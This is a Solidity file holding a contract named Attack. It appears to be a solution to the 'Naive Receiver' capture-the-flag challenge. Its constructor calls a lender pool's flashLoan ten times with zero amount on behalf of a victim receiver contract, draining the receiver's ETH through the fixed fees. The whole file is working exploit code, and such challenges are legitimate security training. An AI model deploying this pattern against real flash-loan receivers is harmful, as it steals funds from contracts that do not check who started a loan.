// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);

    // * view/pure functions
    function ETH() external view returns (address);
}

contract Attack {
    constructor(
        INaiveReceiverLenderPool pool,
        IERC3156FlashBorrower receiverAddress
    ) {
        for (uint i = 0; i < 10; i++) {
            pool.flashLoan(receiverAddress, pool.ETH(), 0 ether, "0x");
        }
    }
}
